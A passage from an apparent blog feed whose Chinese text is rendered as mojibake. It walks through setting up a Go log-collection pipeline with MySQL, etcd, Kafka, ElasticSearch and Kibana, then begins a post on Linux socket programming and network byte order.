class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro logBeegoWeb % bee run</span><br><span class="line">______</span><br><span class="line">| ___ \</span><br><span class="line">| |_/ /  ___   ___</span><br><span class="line">| ___ \ / _ \ / _ \</span><br><span class="line">| |_/ /|  __/|  __/</span><br><span class="line">\____/  \___| \___| v1.12.0</span><br><span class="line">2021/11/12 15:09:30 INFO     â–¶ 0001 Using 'logBeegoWeb' as 'appname'</span><br><span class="line">2021/11/12 15:09:30 INFO     â–¶ 0002 Initializing watcher...</span><br><span class="line">2021/11/12 15:09:32 SUCCESS  â–¶ 0003 Built Successfully!</span><br><span class="line">2021/11/12 15:09:32 INFO     â–¶ 0004 Restarting 'logBeegoWeb'...</span><br><span class="line">2021/11/12 15:09:32 SUCCESS  â–¶ 0005 './logBeegoWeb' is running...</span><br><span class="line">2021/11/12 15:09:32.451 [I] [asm_amd64.s:1374]  http server Running on http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æœ¬åœ°<code>8080</code>ç«¯å£ï¼Œé¡¹ç›®å¯åŠ¨æˆåŠŸ</p><p><img src="/2021/11/12/Goæ—¥å¿—æ”¶é›†é¡¹ç›®æµç¨‹æ¢³ç†/1.png" alt="1"></p><h4 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h4><p>åˆ›å»ºæ•°æ®åº“çš„sqlæºç å¦‚ä¸‹ï¼Œåˆ›å»ºåä¸º<code>logCollect</code> çš„æ•°æ®åº“ï¼Œå¹¶åˆ›å»ºä¸‰å¼ è¡¨ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> logCollect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tbl_app_info(</span><br><span class="line">app_id <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">app_name <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">app_type <span class="built_in">varchar</span>(<span class="number">64</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">create_time <span class="built_in">TIMESTAMP</span> <span class="keyword">DEFAULT</span> <span class="keyword">CURRENT_TIMESTAMP</span>,</span><br><span class="line">develop_path <span class="built_in">varchar</span>(<span class="number">256</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tbl_app_ip(</span><br><span class="line">app_id <span class="built_in">int</span>,</span><br><span class="line">ip <span class="built_in">varchar</span>(<span class="number">64</span>),</span><br><span class="line"><span class="keyword">Key</span> app_id_ip_index (app_id, ip)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tbl_log_info(</span><br><span class="line">log_id <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">app_id <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">log_path <span class="built_in">varchar</span>(<span class="number">64</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">topic <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">create_time <span class="built_in">TIMESTAMP</span> <span class="keyword">DEFAULT</span> <span class="keyword">CURRENT_TIMESTAMP</span>,</span><br><span class="line"><span class="keyword">status</span> <span class="built_in">tinyint</span> <span class="keyword">default</span> <span class="number">1</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>æ•°æ®åº“åˆ›å»ºæˆåŠŸ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span> show tables;</span><br><span class="line">+----------------------+</span><br><span class="line">| Tables_in_logcollect |</span><br><span class="line">+----------------------+</span><br><span class="line">| tbl_app_info         |</span><br><span class="line">| tbl_app_ip           |</span><br><span class="line">| tbl_log_info         |</span><br><span class="line">+----------------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>åœ¨å‰ç«¯ä¸»é¡µé¢ï¼Œé¡¹ç›®åˆ—è¡¨å¯¹åº”<code>tbl_app_info</code>è¿™å¼ è¡¨ï¼Œæ—¥å¿—åˆ—è¡¨å¯¹åº”<code>tbl_log_info</code>è¿™å¼ è¡¨ã€‚<code>tbl_app_ip</code>è¿™å¼ è¡¨ç”¨æ¥ä¿å­˜é¡¹ç›®æ‰€åœ¨çš„<code>ip</code>åœ°å€ã€‚</p><h4 id="etcd"><a href="#etcd" class="headerlink" title="etcd"></a>etcd</h4><p>å½“æˆ‘ä»¬ç”³è¯·å¥½é¡¹ç›®ä¹‹åï¼Œå°±å¯ä»¥é’ˆå¯¹è¯¥é¡¹ç›®æ‰€äº§ç”Ÿçš„æ—¥å¿—è¿›è¡Œæ”¶é›†ã€‚å¯¹äºæ‰€è¦æ”¶é›†çš„æ—¥å¿—é…ç½®ä¿¡æ¯ï¼Œå¯ä»¥é‡‡ç”¨etcdè¿›è¡Œå­˜å‚¨ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥åœ¨æ—¥å¿—ç”³è¯·é¡µå†™å…¥æ‰€è¦æ”¶é›†çš„é¡¹ç›®ä¿¡æ¯ï¼Œå‰ææ˜¯é¡¹ç›®çš„åå­—å¿…é¡»åœ¨é¡¹ç›®åˆ—è¡¨ä¸­æ˜¯å­˜åœ¨çš„ï¼Œå¦åˆ™æ—¥å¿—ç”³è¯·å°±ä¼šå¤±è´¥ã€‚</p><p><img src="/2021/11/12/Goæ—¥å¿—æ”¶é›†é¡¹ç›®æµç¨‹æ¢³ç†/2.png" alt="2"></p><p>etcdä¸­è·å–keyçš„å€¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % etcdctl get /backend/logagent/config/10.100.163.201</span><br><span class="line">/backend/logagent/config/10.100.163.201</span><br><span class="line">[&#123;"logpath":"/Users/caoyifan/test.log","topic":"kafka_test"&#125;]</span><br></pre></td></tr></table></figure><h4 id="logAgent"><a href="#logAgent" class="headerlink" title="logAgent"></a>logAgent</h4><p>logAgenté¡¹ç›®æ ‘ç»“æ„å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">logAgent</span><br><span class="line">â”œâ”€â”€ conf</span><br><span class="line">â”‚Â Â  â””â”€â”€ logAgent.conf</span><br><span class="line">â”œâ”€â”€ kafka</span><br><span class="line">â”‚Â Â  â””â”€â”€ kafka.go</span><br><span class="line">â”œâ”€â”€ logs</span><br><span class="line">â”‚Â Â  â””â”€â”€ my.log</span><br><span class="line">â”œâ”€â”€ main</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ config.go</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ etcd.go</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ ip.go</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ log.go</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ main.go</span><br><span class="line">â”‚Â Â  â””â”€â”€ server.go</span><br><span class="line">â”œâ”€â”€ tailf</span><br><span class="line">â”‚Â Â  â””â”€â”€ tail.go</span><br><span class="line">â””â”€â”€ tools</span><br><span class="line">    â””â”€â”€ SetConf</span><br><span class="line">        â””â”€â”€ main.go</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ¯ä¸ªæ–‡ä»¶çš„å…·ä½“ä½œç”¨å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">logagent.conf :é…ç½®æ–‡ä»¶</span><br><span class="line">kafka.go:å¯¹kafkaçš„æ“ä½œï¼ŒåŒ…æ‹¬åˆå§‹åŒ–kafkaè¿æ¥ï¼Œä»¥åŠç»™kafkaå‘é€æ¶ˆæ¯</span><br><span class="line">my.log:äº§ç”Ÿçš„æ—¥å¿—æ–‡ä»¶</span><br><span class="line">config.go:ç”¨äºåˆå§‹åŒ–è¯»å–é…ç½®æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™é‡Œçš„é…ç½®æ–‡ä»¶åŠ è½½æ˜¯é€šè¿‡ä¹‹å‰è‡ªå·±å®ç°çš„é…ç½®æ–‡ä»¶çƒ­åŠ è½½åŒ…å¤„ç†çš„</span><br><span class="line">etcd.go:å¯¹etcdçš„æ“ä½œï¼ŒåŒ…æ‹¬åˆå§‹åŒ–etcdå’Œç›‘å¬etcd</span><br><span class="line">ip.go:è·å–æœ¬æœºæ‰€æœ‰çš„ç½‘å¡ipï¼Œè¿æ¥etcd</span><br><span class="line">log.go:æ—¥å¿—çš„å¤„ç†ä¸åºåˆ—åŒ–</span><br><span class="line">main.go: åˆå§‹åŒ–å…¥å£æ–‡ä»¶,ä¸æ‰§è¡Œserverçš„å…¥å£å‡½æ•°</span><br><span class="line">server.go:ä¸»è¦æ˜¯tail çš„ç›¸å…³æ“ä½œï¼Œç”¨äºå»è¯»æ—¥å¿—æ–‡ä»¶å¹¶å°†å†…å®¹æ”¾åˆ°channelä¸­</span><br><span class="line">tail.go: ç”¨äºå»è¯»æ—¥å¿—æ–‡ä»¶</span><br><span class="line">SetConf.main.go:å°†è®¾ç½®çš„é…ç½®ä¿¡æ¯å¯¼å…¥åˆ°etcdä¸­</span><br></pre></td></tr></table></figure><p>è¿›å…¥mainæ–‡ä»¶å¤¹ä¸­ï¼Œæ‰§è¡Œ<code>go build</code>å‘½ä»¤ï¼Œä¹‹åæ‰§è¡Œ<code>./main</code>å¯åŠ¨é¡¹ç›®ï¼Œé¡¹ç›®å¯åŠ¨æ—¥å¿—è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2021/11/12 15:32:11.007 [D]  get config from etcd success, [&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:41:14.985 [D]  å¯¼å…¥æ—¥å¿—æˆåŠŸ&amp;&#123;debug /Users/caoyifan/go/src/Golang_logCollect/logAgent/logs/my.log 100 0.0.0.0:9092 [] 0.0.0.0:2379 /backend/logagent/config/&#125;</span><br><span class="line">2021/11/12 15:41:14.987 [D]  resp from etcd:[key:"/backend/logagent/config/10.100.163.201" create_revision:41 mod_revision:61 version:14 value:"[&#123;\"logpath\":\"/Users/caoyifan/test.log\",\"topic\":\"kafka_test\"&#125;]" ]</span><br><span class="line">2021/11/12 15:41:14.987 [D]  æ—¥å¿—è®¾ç½®ä¸º[&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:41:14.987 [D]  è¿æ¥etcdæˆåŠŸ</span><br><span class="line">2021/11/12 15:41:14.987 [D]  åˆå§‹åŒ–etcdæˆåŠŸ!</span><br><span class="line">2021/11/12 15:41:14.987 [D]  åˆå§‹åŒ–tailfæˆåŠŸ!</span><br><span class="line">2021/11/12 15:41:14.988 [D]  å¼€å§‹ç›‘æ§key: /backend/logagent/config/10.100.163.201</span><br><span class="line">2021/11/12 15:41:14.997 [D]  åˆå§‹åŒ–Kafka produceræˆåŠŸ,åœ°å€ä¸º: 0.0.0.0:9092</span><br><span class="line">2021/11/12 15:41:14.997 [D]  åˆå§‹åŒ–KafkaæˆåŠŸ!</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œé¡¹ç›®å¯åŠ¨ä¹‹åé¦–å…ˆä¼šä»etcdä¸­å»è·å–å‰ç«¯å†™å…¥etcdä¸­çš„æ—¥å¿—æ”¶é›†é…ç½®ä¿¡æ¯ï¼Œä¹‹åetcdä¼šæŒç»­ç›‘æ§keyçš„å˜åŒ–ï¼Œä¸€æ—¦æœ‰æ–°çš„æ—¥å¿—é…ç½®åŠ å…¥etcdä¸­ï¼Œå°±ä¼šæ›´æ–°é…ç½®æ–‡ä»¶ï¼Œéšåå¯åŠ¨kafkaå‡†å¤‡ä»æ—¥å¿—æ–‡ä»¶ä¸­è¯»å–æ—¥å¿—ä¿¡æ¯ã€‚</p><p>æµ‹è¯•æ—¥å¿—æ–‡ä»¶è¯»å–</p><p>åœ¨<code>/Users/caoyifan</code>ç›®å½•ä¸‹åˆ›å»º<code>test.log</code>æ–‡ä»¶å¹¶å°è¯•å†™å…¥ä¸€äº›ä¿¡æ¯ã€‚</p><p><img src="/2021/11/12/Goæ—¥å¿—æ”¶é›†é¡¹ç›®æµç¨‹æ¢³ç†/3.png" alt="3"></p><p>å‘ç°kafkaèƒ½å¤ŸæˆåŠŸè¯»å–å†™å…¥çš„æ–‡ä»¶ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2021/11/12 15:46:50.530 [D]  å¯¼å…¥æ—¥å¿—æˆåŠŸ&amp;&#123;debug /Users/caoyifan/go/src/Golang_logCollect/logAgent/logs/my.log 100 0.0.0.0:9092 [] 0.0.0.0:2379 /backend/logagent/config/&#125;</span><br><span class="line">2021/11/12 15:46:50.533 [D]  resp from etcd:[key:"/backend/logagent/config/10.100.163.201" create_revision:41 mod_revision:61 version:14 value:"[&#123;\"logpath\":\"/Users/caoyifan/test.log\",\"topic\":\"kafka_test\"&#125;]" ]</span><br><span class="line">2021/11/12 15:46:50.533 [D]  æ—¥å¿—è®¾ç½®ä¸º[&#123;/Users/caoyifan/test.log kafka_test&#125;]</span><br><span class="line">2021/11/12 15:46:50.533 [D]  è¿æ¥etcdæˆåŠŸ</span><br><span class="line">2021/11/12 15:46:50.533 [D]  åˆå§‹åŒ–etcdæˆåŠŸ!</span><br><span class="line">2021/11/12 15:46:50.533 [D]  åˆå§‹åŒ–tailfæˆåŠŸ!</span><br><span class="line">2021/11/12 15:46:50.533 [D]  å¼€å§‹ç›‘æ§key: /backend/logagent/config/10.100.163.201</span><br><span class="line">2021/11/12 15:46:50.536 [D]  åˆå§‹åŒ–Kafka produceræˆåŠŸ,åœ°å€ä¸º: 0.0.0.0:9092</span><br><span class="line">2021/11/12 15:46:50.536 [D]  åˆå§‹åŒ–KafkaæˆåŠŸ!</span><br><span class="line">2021/11/12 15:47:21.637 [D]  read success, pid:0, offset:0, topic:kafka_test</span><br><span class="line"></span><br><span class="line">2021/11/12 15:47:21.641 [D]  read success, pid:0, offset:1, topic:kafka_test</span><br><span class="line"></span><br><span class="line">2021/11/12 15:47:21.642 [D]  read success, pid:0, offset:2, topic:kafka_test</span><br></pre></td></tr></table></figure><h4 id="logTransfer"><a href="#logTransfer" class="headerlink" title="logTransfer"></a>logTransfer</h4><p>ç¡®ä¿å·²ç»å¯åŠ¨äº†<code>kafka</code>å’Œ<code>ElasticSearch</code>å’Œ<code>kibana</code></p><p>è¿›å…¥mainæ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰§è¡Œ<code>go build</code>ï¼Œè¾“å‡ºæ—¥å¿—å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro main % ./main  </span><br><span class="line">2021/11/17 17:51:56.784 [D]  åˆå§‹åŒ–é…ç½®æˆåŠŸ</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹etcdä¸­çš„æ—¥å¿—é…ç½®ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % etcdctl get /backend/logagent/config/10.100.163.201</span><br><span class="line">/backend/logagent/config/10.100.163.201</span><br><span class="line">[&#123;"logpath":"/Users/caoyifan/kafka.log","topic":"kafka_log"&#125;]</span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬å°è¯•å‘<code>kafka.log</code>ä¸­å†™å…¥ä¸€äº›æµ‹è¯•ä¿¡æ¯</p><p><img src="/2021/11/12/Goæ—¥å¿—æ”¶é›†é¡¹ç›®æµç¨‹æ¢³ç†/4.png" alt="4"></p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æŸ¥çœ‹<code>logAgent</code>ä¸­çš„æ—¥å¿—ï¼Œå‘ç°æ¶ˆæ¯å·²ç»æˆåŠŸå†™å…¥äº†kafkaä¸­</p><p><img src="/2021/11/12/Goæ—¥å¿—æ”¶é›†é¡¹ç›®æµç¨‹æ¢³ç†/5.png" alt="5"></p><p>å†æŸ¥çœ‹<code>logTransfer</code>ä¸­çš„æ—¥å¿—ï¼Œå‘ç°å·²ç»æˆåŠŸæ”¶é›†åˆ°æ—¥å¿—ä¿¡æ¯</p><p><img src="/2021/11/12/Goæ—¥å¿—æ”¶é›†é¡¹ç›®æµç¨‹æ¢³ç†/6.png" alt="6"></p><h4 id="Kibanaå¯è§†åŒ–"><a href="#Kibanaå¯è§†åŒ–" class="headerlink" title="Kibanaå¯è§†åŒ–"></a>Kibanaå¯è§†åŒ–</h4><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å·²ç»æˆåŠŸæ”¶é›†åˆ°äº†kafkaä¸­çš„æ¶ˆæ¯ï¼Œå¹¶ä¸”å·²ç»å°†æ¶ˆæ¯å†™å…¥åˆ°äº†ElasticSearchä¸­ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬é…ç½®ä¸€ä¸‹KibanaæŸ¥çœ‹æ”¶é›†åˆ°çš„ç›¸å…³ä¿¡æ¯ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬åœ¨Kibanaä¸­åˆ›å»ºç´¢å¼•ï¼Œç´¢å¼•åå°±æ˜¯æˆ‘ä»¬åœ¨etcdä¸­è·å–åˆ°çš„topicåç§°ã€‚</p><p><img src="/2021/11/12/Goæ—¥å¿—æ”¶é›†é¡¹ç›®æµç¨‹æ¢³ç†/7.png" alt="7"></p><p>é€šè¿‡postmanï¼Œæˆ‘ä»¬çœ‹åˆ°å½“å‰ElasticSearchä¸­ä¸€å…±æœ‰ä¸‰ä¸ªç´¢å¼•ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬åˆ›å»ºå¥½çš„<code>kafka_log</code>ç´¢å¼•</p><p><img src="/2021/11/12/Goæ—¥å¿—æ”¶é›†é¡¹ç›®æµç¨‹æ¢³ç†/8.png" alt="8"></p><p>æœ€åæˆ‘ä»¬åœ¨Kibanaçš„Discoveræ¨¡å—ä¸‹ï¼Œé€‰æ‹©ç›¸åº”çš„ç´¢å¼•ï¼Œå°±å¯ä»¥çœ‹åˆ°ç´¢å¼•ä¸‹çš„ç›¸å…³æ•°æ®ã€‚</p><p><img src="/2021/11/12/Goæ—¥å¿—æ”¶é›†é¡¹ç›®æµç¨‹æ¢³ç†/9.png" alt="9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h4&gt;&lt;p&gt;è¯¥é¡¹ç›®ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œwebç«¯è´Ÿè´£å¯¹etcdçš„å†™å…¥ä»¥åŠä»mysqlè¯»å†™æ•°æ®è¿›è¡Œå±•ç¤ºã€‚logAgentè´Ÿè´£æ—¥å¿—çš„æ”¶é›†ï¼Œä¸»è¦æ˜¯é€šè¿‡tailä»e
      
    
    </summary>
    
    
      <category term="Go" scheme="elssm.github.io/tags/Go/"/>
    
  </entry>
  
  <entry>
    <title>Linuxç½‘ç»œç¼–ç¨‹</title>
    <link href="elssm.github.io/2021/11/02/Linux%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <id>elssm.github.io/2021/11/02/Linuxç½‘ç»œç¼–ç¨‹/</id>
    <published>2021-11-02T01:24:29.000Z</published>
    <updated>2021-12-13T09:49:28.345Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Socketç¼–ç¨‹"><a href="#Socketç¼–ç¨‹" class="headerlink" title="Socketç¼–ç¨‹"></a>Socketç¼–ç¨‹</h4><h5 id="å¥—æ¥å­—æ¦‚å¿µ"><a href="#å¥—æ¥å­—æ¦‚å¿µ" class="headerlink" title="å¥—æ¥å­—æ¦‚å¿µ"></a>å¥—æ¥å­—æ¦‚å¿µ</h5><p>åœ¨Linuxç¯å¢ƒä¸‹ï¼ŒSocketç”¨äºè¡¨ç¤ºè¿›ç¨‹é—´ç½‘ç»œé€šä¿¡çš„ç‰¹æ®Šæ–‡ä»¶ç±»å‹ã€‚æœ¬è´¨ä¸ºå†…æ ¸å€ŸåŠ©ç¼“å†²åŒºå½¢æˆçš„ä¼ªæ–‡ä»¶ã€‚æ—¢ç„¶æ˜¯æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦å¼•ç”¨å¥—æ¥å­—ï¼Œä¸ç®¡é“ç±»ä¼¼çš„ï¼ŒLinuxç³»ç»Ÿå°†å…¶å°è£…æˆæ–‡ä»¶çš„ç›®çš„æ˜¯ä¸ºäº†ç»Ÿä¸€æ¥å£ï¼Œä½¿å¾—è¯»å†™å¥—æ¥å­—å’Œè¯»å†™æ–‡ä»¶çš„æ“ä½œä¸€è‡´ã€‚åŒºåˆ«æ˜¯ç®¡é“ä¸»è¦åº”ç”¨äºæœ¬åœ°è¿›ç¨‹é—´é€šä¿¡ï¼Œè€Œå¥—æ¥å­—å¤šåº”ç”¨äºç½‘ç»œè¿›ç¨‹é—´æ•°æ®çš„ä¼ é€’ã€‚</p><p>åœ¨<code>TCP/IP</code>åè®®ä¸­ï¼Œâ€IPåœ°å€+TCPæˆ–UDPç«¯å£å·â€å”¯ä¸€æ ‡è¯†ç½‘ç»œé€šè®¯ä¸­çš„ä¸€ä¸ªè¿›ç¨‹ï¼Œâ€IPåœ°å€+ç«¯å£å·â€å°±å¯¹åº”ä¸€ä¸ª<code>socket</code>ã€‚æ¬²å»ºç«‹è¿æ¥çš„ä¸¤ä¸ªè¿›ç¨‹å„è‡ªæœ‰ä¸€ä¸ª<code>socket</code>æ¥æ ‡è¯†ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ª<code>socket</code>ç»„æˆçš„<code>socket pair</code>å°±å”¯ä¸€æ ‡è¯†ä¸€ä¸ªè¿æ¥ï¼Œå› æ­¤å¯ä»¥ç”¨<code>Socket</code>æ¥æè¿°ç½‘ç»œè¿æ¥çš„ä¸€å¯¹ä¸€å…³ç³»ã€‚</p><p>åœ¨ç½‘ç»œé€šä¿¡ä¸­ï¼Œå¥—æ¥å­—ä¸€å®šæ˜¯æˆå¯¹å‡ºç°çš„ã€‚ä¸€ç«¯çš„å‘é€ç¼“å†²åŒºå¯¹åº”å¯¹ç«¯çš„æ¥å—ç¼“å†²åŒºã€‚æˆ‘ä»¬ä½¿ç”¨åŒä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å¯¹åº”å‘é€ç¼“å†²åŒºå’Œæ¥æ”¶ç¼“å†²åŒºã€‚</p><h5 id="ç½‘ç»œå­—èŠ‚åº"><a href="#ç½‘ç»œå­—èŠ‚åº" class="headerlink" title="ç½‘ç»œå­—èŠ‚åº"></a>ç½‘ç»œå­—èŠ‚åº</h5><p>æˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œå†…å­˜ä¸­çš„å¤šå­—èŠ‚æ•°æ®ç›¸å¯¹äºå†…å­˜åœ°å€æœ‰å¤§ç«¯å’Œå°ç«¯ä¹‹åˆ†ï¼Œç£ç›˜æ–‡ä»¶ä¸­çš„å¤šå­—èŠ‚æ•°æ®ç›¸å¯¹äºæ–‡ä»¶ä¸­çš„åç§»åœ°å€ä¹Ÿæœ‰å¤§ç«¯å°ç«¯ä¹‹åˆ†ï¼Œç½‘ç»œæ•°æ®æµåŒæ ·æœ‰å¤§ç«¯å°ç«¯ä¹‹åˆ†ï¼Œé‚£ä¹ˆå¦‚ä½•å®šä¹‰ç½‘ç»œæ•°æ®æµçš„åœ°å€å‘¢ã€‚å‘é€ä¸»æœºé€šå¸¸å°†å‘é€ç¼“å†²åŒºä¸­çš„æ•°æ®æŒ‰å†…å­˜åœ°å€ä»ä½åˆ°é«˜çš„é¡ºåºå‘å‡ºã€‚æ¥æ”¶ä¸»æœºæŠŠä»ç½‘ç»œä¸Šæ¥åˆ°çš„å­—èŠ‚ä¸€æ¬¡ä¿å­˜åœ¨æ¥å—ç¼“å†²åŒºä¸­ï¼Œä¹Ÿæ˜¯æŒ‰å†…å­˜åœ°å€ä»ä½åˆ°é«˜çš„é¡ºåºä¿å­˜ï¼Œå› æ­¤ï¼Œç½‘ç»œæ•°æ®æµçš„åœ°å€åº”è¿™æ ·è§„å®šï¼šå…ˆå‘å‡ºçš„æ•°æ®æ˜¯ä½åœ°å€ï¼Œåå‘å‡ºçš„æ•°æ®æ˜¯é«˜åœ°å€ã€‚</p><p><code>TCP/IP</code>åè®®è§„å®šï¼Œç½‘ç»œæ•°æ®æµåº”é‡‡ç”¨å¤§ç«¯å­—èŠ‚åºï¼Œå³ä½åœ°å€é«˜å­—èŠ‚ï¼Œä¾‹å¦‚åœ¨<code>UDP</code>æ®µæ ¼å¼ä¸­ï¼Œåœ°å€<code>0-1</code>æ˜¯16ä½çš„æºç«¯å£å·ï¼Œå¦‚æœè¿™ä¸ªç«¯å£å·æ˜¯<code>1000(0x3e8)</code>ï¼Œåˆ™åœ°å€0æ˜¯<code>0x03</code>ï¼Œåœ°å€1æ—¶æ˜¯<code>0xe8</code>ï¼Œä¹Ÿå°±æ˜¯å…ˆå‘<code>0x03</code>ï¼Œå†å‘<code>0xe8</code>ï¼Œè¿™16ä½åœ¨å‘é€ä¸»æœºçš„ç¼“å†²åŒºä¸­ä¹Ÿåº”è¯¥æ˜¯ä½åœ°å€å­˜<code>0x03</code>ï¼Œé«˜åœ°å€å­˜<code>0xe8</code>ï¼Œä½†æ˜¯å¦‚æœå‘é€ä¸»æœºæ˜¯å°ç«¯å­—èŠ‚åºçš„ï¼Œè¿™16ä½è¢«è§£é‡Šæˆ<code>0xe803</code>ï¼Œè€Œä¸æ˜¯1000ã€‚å› æ­¤å‘é€ä¸»æœºæŠŠ1000å¡«åˆ°å‘é€ç¼“å†²åŒºä¹‹å‰éœ€è¦åšå­—èŠ‚åºçš„è½¬æ¢ã€‚åŒæ 